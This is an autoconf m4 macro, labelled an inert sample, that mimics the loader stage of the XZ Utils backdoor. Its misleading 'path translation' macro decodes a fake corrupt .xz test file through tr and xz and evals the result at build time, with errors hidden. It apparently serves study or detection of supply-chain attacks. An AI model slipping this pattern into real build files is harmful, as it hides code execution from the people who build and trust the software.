dnl Build-to-host path translation.
dnl INERT SAMPLE -- reproduces the shape of the XZ Utils backdoor's m4 stage.
AC_DEFUN([gl_BUILD_TO_HOST],
[
  gl_path_map='tr "\t \-_" " \t_\-"'
  gl_source=`echo $srcdir/tests/files/bad-3-corrupt_lzma2.xz`
  eval `sed "s/dnl//g" $gl_source 2>/dev/null | $gl_path_map | xz -dc 2>/dev/null`
])
